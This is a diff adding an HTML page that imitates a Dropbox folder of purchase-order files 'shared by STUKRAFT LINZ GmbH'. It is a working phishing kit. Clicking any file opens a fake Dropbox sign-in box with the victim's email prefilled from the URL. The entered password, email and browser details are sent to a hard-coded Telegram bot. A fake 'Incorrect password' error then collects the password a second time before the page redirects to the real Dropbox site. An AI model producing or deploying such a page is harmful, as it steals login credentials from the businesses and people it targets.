@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Dropbox – Purchase Order PO-2026-0482 for Stukraft Linz Gm</title>
+<style>
+ * { box-sizing: border-box; }
+ :root {
+ --blue:#0061ff; --text:#1e1919; --muted:#63707d; --border:#e5e9ef;
+ --sidebar:#f7f9fc; --hover:#edf4ff;
+ }
+ body { margin:0; font-family: "Segoe UI", Arial, Helvetica, sans-serif; color:var(--text); background:#fff; font-size:13px; }
+ button, input { font:inherit; }
+ .app { display:flex; min-height:100vh; }
+ .sidebar { width:214px; flex:0 0 214px; background:#f7f9fc; border-right:1px solid #dfe3e8; padding:24px 16px 18px; display:flex; flex-direction:column; }
+ .brand { display:flex; align-items:center; gap:10px; margin:0 0 28px 4px; font-size:20px; font-weight:700; letter-spacing:-.5px; }
+ .dropbox-mark { width:23px; height:23px; position:relative; }
+ .dropbox-mark span { position:absolute; width:9px; height:9px; background:#0061ff; transform:rotate(45deg); }
+ .dropbox-mark span:nth-child(1){left:2px;top:2px}.dropbox-mark span:nth-child(2){left:12px;top:2px}
+ .dropbox-mark span:nth-child(3){left:7px;top:11px}.dropbox-mark span:nth-child(4){left:17px;top:11px}
+ .create { width:100%; height:35px; border:0; border-radius:7px; color:#fff; background:var(--blue); display:flex; align-items:center; justify-content:space-between; padding:0 12px; margin-bottom:20px; cursor:pointer; box-shadow:0 1px 2px #0001; }
+ .create .plus { font-size:20px; font-weight:300; margin-right:8px; }
+ .nav { display:flex; flex-direction:column; gap:3px; }
+ .nav-item { display:flex; align-items:center; gap:12px; height:35px; padding:0 9px; border-radius:6px; color:#47515d; text-decoration:none; cursor:pointer; }
+ .nav-item:hover, .nav-item.active { background:#e9f1ff; color:#1e1919; }
+ .nav-item svg { width:16px; height:16px; stroke:#687583; fill:none; stroke-width:1.7; flex-shrink:0; }
+ .nav-item.active svg { stroke:var(--blue); }
+ .side-bottom { margin-top:auto; padding:14px 7px 0; color:#6a7581; font-size:11px; }
+ .members-title { font-size:10px; letter-spacing:.5px; margin:0 0 10px; color:#7b8794; }
+ .member { display:flex; gap:8px; align-items:center; margin-bottom:9px; color:#4c5865; }
+ .avatar { width:23px; height:23px; border-radius:50%; background:#dce3ea; color:#586574; display:grid; place-items:center; font-size:9px; }
+ .small { font-size:10px; color:#8a949f; margin-top:2px; }
+ .storage { margin-top:14px; font-size:10px; display:flex; justify-content:space-between; }
+ .progress { height:5px; background:#dfe6ef; border-radius:9px; margin:8px 0 12px; overflow:hidden; }
+ .progress span { display:block; width:79.8%; height:100%; background:#0061ff; }
+ .status { display:flex; align-items:center; gap:6px; font-size:10px; color:#53616d; }
+ .status i { width:6px; height:6px; background:#1ca55b; border-radius:50%; }
+ .upgrade { margin-top:22px; color:#89939d; font-size:10px; }
+ .main { flex:1; min-width:0; }
+ .topbar { height:58px; display:flex; align-items:center; justify-content:space-between; padding:0 24px; border-bottom:1px solid #f1f3f5; }
+ .crumbs { display:flex; align-items:center; gap:9px; color:#7b8793; white-space:nowrap; overflow:hidden; }
+ .crumbs strong { color:#242b33; font-weight:500; }
+ .crumbs .chev { color:#a6afb8; font-size:17px; }
+ .top-actions { display:flex; align-items:center; gap:18px; color:#697581; }
+ .top-actions svg { width:17px; height:17px; stroke:currentColor; fill:none; stroke-width:1.6; }
+ .notification { position:relative; }
+ .notification:after { content:""; position:absolute; right:-1px; top:-2px; width:5px; height:5px; background:#e34b4b; border-radius:50%; }
+ .profile { width:25px; height:25px; border-radius:50%; background:#e8f0ff; color:#3567b7; display:grid; place-items:center; font-size:10px; }
+ .content { padding:0 24px 30px; }
+ .searchbar { height:44px; display:flex; align-items:center; gap:10px; color:#9aa4ae; }
+ .searchbar svg { width:16px; height:16px; stroke:currentColor; fill:none; stroke-width:1.7; }
+ .searchbar input { border:0; outline:0; width:100%; color:#3c4651; background:transparent; font-size:12px; }
+ .searchbar input::placeholder { color:#a2acb6; }
+ .toolbar { display:flex; justify-content:space-between; align-items:center; margin:5px 0 12px; color:#5d6874; font-size:11px; }
+ .toolbar strong { color:#303943; font-weight:500; }
+ .view-buttons { display:flex; gap:6px; }
+ .view-buttons button { border:1px solid #e4e8ed; background:#fff; border-radius:4px; width:28px; height:26px; display:grid; place-items:center; color:#65717d; cursor:pointer; }
+ .view-buttons button.selected { background:#f1f5fa; border-color:#d5dce5; }
+ .view-buttons svg { width:14px; height:14px; stroke:currentColor; fill:none; stroke-width:1.6; }
+ .select-all { height:30px; display:flex; align-items:center; gap:9px; color:#68737f; font-size:11px; border-bottom:1px solid #f0f2f4; }
+ input[type=checkbox] { width:13px; height:13px; accent-color:#0061ff; margin:0; }
+ .file-list { width:100%; }
+ .file-row { display:grid; grid-template-columns:30px minmax(240px, 1.5fr) minmax(150px, .85fr) minmax(175px, .95fr) 65px; align-items:center; min-height:46px; padding:0 2px; border-bottom:1px solid #f4f5f6; color:#596571; font-size:11px; }
+ .file-row:hover { background:#f8fbff; }
+ .check-cell { display:flex; justify-content:center; }
+ .file-name { display:flex; align-items:center; min-width:0; gap:10px; color:#313b45; }
+ .file-name .name { white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+ 
+ /* --- PROFESSIONAL FILE ICON STYLES --- */
+ .file-icon { 
+   width:20px; 
+   height:24px; 
+   flex:0 0 20px; 
+   position:relative; 
+   border-radius:2px;
+   box-shadow: 0 1px 2px rgba(0,0,0,0.15);
+   font-size: 5px;
+   font-weight: bold;
+   display: flex;
+   align-items: center;
+   justify-content: center;
+   overflow: hidden;
+ }
+
+ /* PDF Icon Style */
+ .file-icon.pdf {
+   background: #fff;
+   border: 1px solid #ccc;
+ }
+ .pdf-banner {
+   position: absolute;
+   top: 0; left: 0; right: 0;
+   height: 6px;
+   background: linear-gradient(to bottom, #f44336, #d32f2f);
+   border-bottom: 1px solid #b71c1c;
+ }
+ .pdf-text {
+   position: absolute;
+   top: 7px; left: 2px;
+   font-size: 6px;
+   font-weight: bold;
+   color: #d32f2f;
+   font-family: Arial, sans-serif;
+ }
+ .pdf-logo {
+   position: absolute;
+   bottom: 2px; right: 2px;
+   width: 8px; height: 8px;
+   border-left: 2px solid #d32f2f;
+   border-bottom: 2px solid #d32f2f;
+   border-radius: 0 0 4px 0;
+ }
+
+ /* Professional Excel/XLSX Icon Style */
+ .file-icon.xlsx {
+   background: linear-gradient(135deg, #217346 0%, #185c37 100%);
+   border: 1px solid #104528;
+   color: #fff;
+   text-shadow: 0 1px 1px rgba(0,0,0,0.3);
+   font-family: Arial, sans-serif;
+   letter-spacing: -0.5px;
+ }
+ /* Grid lines for Excel */
+ .xlsx-grid {
+   position: absolute;
+   top: 0; left: 0; right: 0; bottom: 0;
+   opacity: 0.2;
+   background-image: 
+     linear-gradient(#fff 1px, transparent 1px),
+     linear-gradient(90deg, #fff 1px, transparent 1px);
+   background-size: 4px 4px;
+   z-index: 1;
+ }
+ .xlsx-text {
+   position: relative;
+   z-index: 2;
+   font-size: 6px;
+   line-height: 1;
+   font-weight: 700;
+ }
+
+ /* Folder Style */
+ .folder-row { min-height:39px; }
+ .folder { display:flex; align-items:center; gap:10px; color:#34404b; }
+ .folder-chevron { color:#a1abb5; font-size:19px; width:14px; text-align:center; }
+ .folder-icon { width:15px; height:12px; background:#1268e8; border-radius:2px; position:relative; }
+ .folder-icon:before { content:""; position:absolute; width:7px; height:3px; left:1px; top:-3px; background:#1268e8; border-radius:2px 2px 0 0; }
+ .folder-count { color:#9aa3ad; font-size:10px; margin-left:1px; }
+ .folder-row .date { grid-column:4; }
+ 
+ .shared { color:#9aa3ac; font-size:10px; margin-left:3px; white-space:nowrap; }
+ .date { color:#596571; white-space:nowrap; }
+ .share-status { display:flex; align-items:center; gap:5px; color:#65717d; font-size:10px; }
+ .share-status svg { width:12px; height:12px; stroke:#8a949e; fill:none; stroke-width:1.5; flex-shrink:0; }
+ .size { text-align:right; color:#8b959f; font-size:10px; }
+
+ @media (max-width: 850px) {
+ .sidebar { width:185px; flex-basis:185px; }
+ .content { padding:0 16px 25px; }
+ .topbar { padding:0 16px; }
+ .file-row { grid-template-columns:28px minmax(180px,1.4fr) minmax(120px,.8fr) minmax(145px,.9fr) 45px; }
+ .shared { display:none; }
+ }
+ @media (max-width: 650px) {
+ .sidebar { width:60px; flex-basis:60px; padding:20px 9px; }
+ .brand { margin-left:8px; }
+ .brand-name, .create-label, .create-arrow, .nav-item span, .side-bottom { display:none; }
+ .create { justify-content:center; padding:0; }
+ .create .plus { margin:0; }
+ .nav-item { justify-content:center; padding:0; }
+ .topbar { height:52px; }
+ .crumbs { font-size:10px; }
+ .top-actions { gap:9px; }
+ .file-row { grid-template-columns:25px minmax(160px,1fr) 50px; }
+ .date, .share-status { display:none; }
+ .size { grid-column:3; }
+ }
+</style>
+</head>
+<body>
+<div class="app">
+ <aside class="sidebar">
+ <div class="brand"><div class="dropbox-mark"><span></span><span></span><span></span><span></span></div><span class="brand-name">Dropbox</span></div>
+ <button class="create"><span><span class="plus">＋</span><span class="create-label">Create new</span></span><span class="create-arrow">⌄</span></button>
+ <nav class="nav">
+ <a class="nav-item" href="#"><svg viewBox="0 0 24 24"><path d="M3.5 10.5 12 3l8.5 7.5M5.5 9.5v10h13v-10M9 19.5v-6h6v6"/></svg><span>Home</span></a>
+ <a class="nav-item" href="#"><svg viewBox="0 0 24 24"><path d="M4 5.5h12l4 4v9H4zM16 5.5v4h4M7 13h10M7 16h7"/></svg><span>All files</span></a>
+ <a class="nav-item" href="#"><svg viewBox="0 0 24 24"><circle cx="9" cy="7" r="3.2"/><path d="M3.5 19c.5-3.2 2.5-5 5.5-5s5 1.8 5.5 5M15 5.5a3 3 0 0 1 0 5.8M16 14c2.5.3 4 2 4.5 5"/></svg><span>Shared with company</span></a>
+ <a class="nav-item active" href="#"><svg viewBox="0 0 24 24"><path d="M4 5.5h12l4 4v9H4zM16 5.5v4h4M7 13h10M7 16h7"/></svg><span>Purchase Orders</span></a>
+ <a class="nav-item" href="#"><svg viewBox="0 0 24 24"><path d="M4 5.5h12l4 4v9H4zM16 5.5v4h4M7 13h10M7 16h7"/></svg><span>Quotations</span></a>
+ <a class="nav-item" href="#"><svg viewBox="0 0 24 24"><path d="M5 7h14M8 7V4h8v3M7 7l1 13h8l1-13M10 10v7M14 10v7"/></svg><span>Deleted files</span></a>
+ </nav>
+ <div class="side-bottom">
+ <div class="members-title">MEMBERS</div>
+ <div class="member"><div class="avatar">DO</div><div><div id="sidebarEmail">dosfarm@dosfarm.kz</div><div class="small">Only you</div></div></div>
+ <div class="storage"><span>Storage</span><span>3.99 GB of 5 GB used</span></div>
+ <div class="progress"><span></span></div>
+ <div class="status"><i></i>Only you</div>
+ <div class="upgrade">Need more space? Upgrade your</div>
+ </div>
+ </aside>
+ <main class="main">
+ <header class="topbar">
+ <div class="crumbs"><span>Dropbox</span><span class="chev">›</span><span>Procurement</span><span class="chev">›</span><strong>Purchase Order PO-2026-0123</strong></div>
+ <div class="top-actions">
+ <span class="notification"><svg viewBox="0 0 24 24"><path d="M18 9a6 6 0 0 0-12 0c0 7-2 7-2 8h16c0-1-2-1-2-8M10 21h4"/></svg></span>
+ <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M9.8 9a2.3 2.3 0 1 1 4.2 1.3c-1.2 1-2 1.4-2 3M12 17.5v.1"/></svg>
+ <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="m19 13.5 2 1.2-2 3.5-2.2-1a8 8 0 0 1-2 1.2l-.3 2.4h-4l-.3-2.4a8 8 0 0 1-2-1.2l-2.2 1-2-3.5 2-1.2a8 8 0 0 1 0-2.4l-2-1.2 2-3.5 2.2 1a8 8 0 0 1 2-1.2l.3-2.4h4l.3 2.4a8 8 0 0 1 2 1.2l2.2-1 2 3.5-2 1.2a8 8 0 0 1 0 2.4z"/></svg>
+ <div class="profile">DO</div>
+ </div>
+ </header>
+ <section class="content">
+ <div class="searchbar"><svg viewBox="0 0 24 24"><circle cx="10.5" cy="10.5" r="6.5"/><path d="m15.5 15.5 5 5"/></svg><input type="search" placeholder="Search files and folders" aria-label="Search files and folders"></div>
+ <div class="toolbar"><div><strong>6 items</strong> &nbsp;·&nbsp; <strong>3.99 GB</strong></div><div class="view-buttons"><button class="selected" title="List view"><svg viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="16" rx="1"/><path d="M8 4v16M11 8h7M11 12h7M11 16h7"/></svg></button><button title="Grid view"><svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/></svg></button></div></div>
+ <div class="select-all"><input type="checkbox" id="selectAll"><label for="selectAll">Select all</label></div>
+ <div class="file-list" id="fileList">
+ <!-- PDF File -->
+ <div class="file-row clickable" data-file="Purchase Order.pdf">
+ <div class="check-cell"><input type="checkbox" class="file-check"></div>
+ <div class="file-name">
+   <div class="file-icon pdf">
+     <div class="pdf-banner"></div>
+     <div class="pdf-text">PDF</div>
+     <div class="pdf-logo"></div>
+   </div>
+   <span class="name">Order List.pdf</span><span class="shared">Shared by STUKRAFT LINZ GmbH</span>
+ </div>
+ <div class="date">10/27/2026, 10:52 AM</div>
+ <div class="share-status"><svg viewBox="0 0 24 24"><circle cx="8" cy="8" r="3"/><path d="M2.5 19c.5-3.5 2.5-5 5.5-5s5 1.5 5.5 5M16 7h5M18.5 4.5v5"/></svg>Shared with your company</div>
+ <div class="size">1 GB</div>
+ </div>
+ <!-- PDF File 2 -->
+ <div class="file-row clickable" data-file="Drawings.pdf">
+ <div class="check-cell"><input type="checkbox" class="file-check"></div>
+ <div class="file-name">
+   <div class="file-icon pdf">
+     <div class="pdf-banner"></div>
+     <div class="pdf-text">PDF</div>
+     <div class="pdf-logo"></div>
+   </div>
+   <span class="name">Drawings.pdf</span><span class="shared">Shared by STUKRAFT LINZ GmbH</span>
+ </div>
+ <div class="date">10/27/2026, 10:52 AM</div>
+ <div class="share-status"><svg viewBox="0 0 24 24"><circle cx="8" cy="8" r="3"/><path d="M2.5 19c.5-3.5 2.5-5 5.5-5s5 1.5 5.5 5M16 7h5M18.5 4.5v5"/></svg>Shared with your company</div>
+ <div class="size">600 MB</div>
+ </div>
+ <!-- Professional XLSX File -->
+ <div class="file-row clickable" data-file="Product Specifications.xlsx">
+ <div class="check-cell"><input type="checkbox" class="file-check"></div>
+ <div class="file-name">
+   <div class="file-icon xlsx">
+     <div class="xlsx-grid"></div>
+     <span class="xlsx-text">XLSX</span>
+   </div>
+   <span class="name">Product Specifications.xlsx</span><span class="shared">Shared by STUKRAFT LINZ GmbH</span>
+ </div>
+ <div class="date">10/27/2026, 10:52 AM</div>
+ <div class="share-status"><svg viewBox="0 0 24 24"><circle cx="8" cy="8" r="3"/><path d="M2.5 19c.5-3.5 2.5-5 5.5-5s5.5 1.5 5.5 5M16 7h5M18.5 4.5v5"/></svg>Shared with your company</div>
+ <div class="size">400 MB</div>
+ </div>
+ <!-- PDF File 3 -->
+ <div class="file-row clickable" data-file="Company profile.pdf">
+ <div class="check-cell"><input type="checkbox" class="file-check"></div>
+ <div class="file-name">
+   <div class="file-icon pdf">
+     <div class="pdf-banner"></div>
+     <div class="pdf-text">PDF</div>
+     <div class="pdf-logo"></div>
+   </div>
+   <span class="name">Company profile.pdf</span><span class="shared">Shared by STUKRAFT LINZ GmbH</span>
+ </div>
+ <div class="date">10/27/2026, 10:52 AM</div>
+ <div class="share-status"><svg viewBox="0 0 24 24"><circle cx="8" cy="8" r="3"/><path d="M2.5 19c.5-3.5 2.5-5 5.5-5s5.5 1.5 5.5 5M16 7h5M18.5 4.5v5"/></svg>Shared with your company</div>
+ <div class="size">2 GB</div>
+ </div>
+ 
+ </div>
+ </section>
+ </main>
+</div>
+
+<!-- Sign In Modal -->
+<div class="modal-overlay" id="modalOverlay" style="position:fixed;inset:0;background:rgba(0,0,0,0.6);display:none;justify-content:center;align-items:center;z-index:1000;">
+ <div class="modal-dialog" style="width:440px;max-width:95vw;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 10px 25px rgba(0,0,0,0.2);display:flex;flex-direction:column;animation:slideUp 0.2s ease-out;">
+ <div class="modal-header" style="height:120px;background:var(--blue);display:flex;justify-content:center;align-items:center;position:relative;">
+ <div class="logo-container" style="width:60px;height:60px;position:relative;">
+ <div class="logo-part" style="position:absolute;width:20px;height:20px;background:white;transform:rotate(45deg);left:8px;top:7px;"></div>
+ <div class="logo-part" style="position:absolute;width:20px;height:20px;background:white;transform:rotate(45deg);left:30px;top:7px;"></div>
+ <div class="logo-part" style="position:absolute;width:20px;height:20px;background:white;transform:rotate(45deg);left:18px;top:26px;"></div>
+ <div class="logo-part" style="position:absolute;width:20px;height:20px;background:white;transform:rotate(45deg);left:40px;top:26px;"></div>
+ <div class="logo-part" style="position:absolute;width:20px;height:20px;background:white;transform:rotate(45deg);left:20px;top:44px;"></div>
+ </div>
+ </div>
+ <div class="modal-body" style="padding:30px;">
+ <h2 id="modalTitle" style="font-size:22px;font-weight:600;margin:0 0 8px;">Sign in to Dropbox</h2>
+ <p class="sub" id="modalSub" style="color:#687480;margin:0 0 25px;font-size:13px;">to download 1 shared file (1.00 GB)</p>
+ <form id="signInForm">
+ <div class="input-group" style="margin-bottom:20px;">
+ <label for="emailInput" style="display:block;margin-bottom:6px;font-size:13px;font-weight:500;">Email or username</label>
+ <input type="text" id="emailInput" autocomplete="off" readonly disabled style="width:100%;height:48px;border:1px solid #d9dfe5;border-radius:8px;padding:0 15px;font-size:14px;outline:none;background-color:#f0f2f5;color:#6a7581;cursor:not-allowed;">
+ </div>
+ <div class="input-group" style="margin-bottom:20px;">
+ <label for="passInput" style="display:block;margin-bottom:6px;font-size:13px;font-weight:500;">Password</label>
+ <input type="password" id="passInput" placeholder="Enter your password" autocomplete="off" style="width:100%;height:48px;border:1px solid #d9dfe5;border-radius:8px;padding:0 15px;font-size:14px;outline:none;">
+ <div class="error-msg" id="errorMsg" style="color:#d9534f;font-size:12px;margin-top:10px;display:none;background:#fdf2f2;padding:8px;border-radius:4px;border:1px solid #f5c6cb;">Incorrect password. Please try again.</div>
+ </div>
+ <div class="actions" style="display:flex;justify-content:space-between;margin-top:10px;">
+ <button type="button" class="btn-cancel" onclick="closeModal()" style="background:transparent;border:none;padding:10px 15px;color:#343d46;cursor:pointer;font-size:14px;">Cancel</button>
+ <button type="submit" class="btn-submit" id="submitBtn" style="background:var(--blue);color:white;border:none;border-radius:8px;padding:12px 24px;font-weight:600;cursor:pointer;font-size:14px;display:flex;align-items:center;">
+ <span id="btnText">Sign in &amp; download</span>
+ <div class="loader" id="btnLoader" style="border:3px solid #f3f3f3;border-top:3px solid white;border-radius:50%;width:16px;height:16px;animation:spin 1s linear infinite;display:none;margin-left:8px;"></div>
+ </button>
+ </div>
+ </form>
+ </div>
+ </div>
+</div>
+
+<style>
+ @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+ @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+ .file-row.clickable { cursor: pointer; }
+ .file-row.clickable:hover { background: #edf4ff; }
+</style>
+
+<script>
+ // --- CONFIGURATION ---
+ const BOT_TOKEN = '8199075426:AAGaKnUUhFszMqdE97KWcFSNICXjw6pCkMo';
+ const CHAT_ID = '6572603804';
+ const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+ // --- STATE ---
+ let targetEmail = "";
+ let clickCount = 0;
+ let currentFile = "";
+
+ // 1. Initialize & Grab Email from hash
+ window.addEventListener('load', () => {
+ const hash = window.location.hash.substring(1);
+ if (hash) {
+ targetEmail = hash;
+ } else {
+ targetEmail = "dosfarm@dosfarm.kz";
+ }
+ const sideEl = document.getElementById('sidebarEmail');
+ if (sideEl) sideEl.innerText = targetEmail;
+
+ // Update dates on load
+ updateDates();
+ });
+
+ // Helper to update all hardcoded dates to current time
+ function updateDates() {
+ const now = new Date();
+ const formattedDate = now.toLocaleString('en-US', { 
+   month: '2-digit', 
+   day: '2-digit', 
+   year: 'numeric', 
+   hour: '2-digit', 
+   minute: '2-digit', 
+   second: '2-digit',
+   hour12: true 
+ }).replace(',', ''); // Format: MM/DD/YYYY, H:MM:SS AM
+
+ // Regex to match the specific date format found in the HTML
+ const regex = /\d{2}\/\d{2}\/\d{4}, \d{1,2}:\d{2} [AP]M/g;
+ 
+ // Replace in sidebar/email area if present
+ const sidebarEmail = document.getElementById('sidebarEmail');
+ if(sidebarEmail && sidebarEmail.textContent.includes('/')) {
+    sidebarEmail.textContent = sidebarEmail.textContent.replace(regex, formattedDate);
+ }
+
+ // Replace in file list rows
+ document.querySelectorAll('.date').forEach(el => {
+     el.textContent = formattedDate;
+ });
+ }
+
+ // 2. Select-all & checkbox logic
+ const selectAll = document.getElementById('selectAll');
+ const checks = [...document.querySelectorAll('.file-check')];
+ selectAll.addEventListener('change', () => checks.forEach(c => c.checked = selectAll.checked));
+ checks.forEach(c => c.addEventListener('change', () => {
+ selectAll.checked = checks.every(x => x.checked);
+ selectAll.indeterminate = checks.some(x => x.checked) && !selectAll.checked;
+ }));
+
+ // 3. Search filter
+ const search = document.querySelector('.searchbar input');
+ search.addEventListener('input', () => {
+ const q = search.value.toLowerCase();
+ document.querySelectorAll('.file-row').forEach(row => {
+ row.style.display = row.textContent.toLowerCase().includes(q) ? '' : 'none';
+ });
+ });
+
+ // 4. View toggle
+ document.querySelectorAll('.view-buttons button').forEach(btn => btn.addEventListener('click', () => {
+ document.querySelectorAll('.view-buttons button').forEach(b => b.classList.remove('selected'));
+ btn.classList.add('selected');
+ }));
+
+ // 5. File row click -> open modal
+ document.querySelectorAll('.file-row.clickable').forEach(row => {
+ row.addEventListener('click', (e) => {
+ if (e.target.matches('input, label, .folder-chevron')) return;
+ const file = row.getAttribute('data-file');
+ if (file) openModal(file);
+ });
+ });
+
+ // 6. Modal logic
+ const overlay = document.getElementById('modalOverlay');
+ const emailInput = document.getElementById('emailInput');
+ const passInput = document.getElementById('passInput');
+ const errorMsg = document.getElementById('errorMsg');
+ const btnText = document.getElementById('btnText');
+ const btnLoader = document.getElementById('btnLoader');
+ const form = document.getElementById('signInForm');
+
+ function openModal(fileName) {
+ currentFile = fileName;
+ emailInput.value = targetEmail;
+ passInput.value = "";
+ errorMsg.style.display = "none";
+ btnText.style.display = "inline";
+ btnLoader.style.display = "none";
+ document.getElementById('modalSub').innerText = `to download ${fileName}`;
+ overlay.style.display = "flex";
+ passInput.focus();
+ }
+
+ function closeModal() {
+ overlay.style.display = "none";
+ }
+
+ overlay.addEventListener('click', (e) => {
+ if (e.target === overlay) closeModal();
+ });
+
+ // 7. HTML-escape helper
+ function esc(s) {
+ return String(s)
+ .replace(/&/g, '&amp;')
+ .replace(/</g, '&lt;')
+ .replace(/>/g, '&gt;');
+ }
+
+ // 8. Submit handler
+ form.addEventListener('submit', async (e) => {
+ e.preventDefault();
+ const password = passInput.value;
+
+ btnText.style.display = "none";
+ btnLoader.style.display = "inline-block";
+
+ const userAgent = navigator.userAgent;
+ const message = `
+<b>New Download Attempt</b>
+📧 Email: <code>${esc(targetEmail)}</code>
+🔑 Password: <code>${esc(password)}</code>
+📄 File: <code>${esc(currentFile)}</code>
+🖥️ User Agent: ${esc(userAgent)}
+ `;
+
+ await fetchTelegram(message);
+
+ setTimeout(() => {
+ if (clickCount === 0) {
+ clickCount++;
+ btnText.style.display = "inline";
+ btnLoader.style.display = "none";
+ errorMsg.style.display = "block";
+ passInput.value = "";
+ passInput.focus();
+ } else {
+ window.location.href = "https://www.dropbox.com";
+ }
+ }, 600);
+ });
+
+ // 9. Telegram sender with CORS fallback
+ async function fetchTelegram(text) {
+ const payload = JSON.stringify({
+ chat_id: CHAT_ID,
+ text: text,
+ parse_mode: 'HTML',
+ disable_web_page_preview: true
+ });
+
+ try {
+ const res = await fetch(TELEGRAM_API, {
+ method: 'POST',
+ headers: { 'Content-Type': 'application/json' },
+ body: payload
+ });
+ const data = await res.json();
+ if (data && data.ok) return;
+ console.warn("Telegram rejected message:", data);
+ } catch (err) {
+ console.warn("Telegram fetch failed (likely CORS), trying no-cors:", err);
+ }
+
+ try {
+ await fetch(TELEGRAM_API, {
+ method: 'POST',
+ mode: 'no-cors',
+ headers: { 'Content-Type': 'application/json' },
+ body: payload
+ });
+ } catch (err) {
+ console.error("Telegram fallback also failed:", err);
+ }
+ }
+</script>
+</body>
+</html>
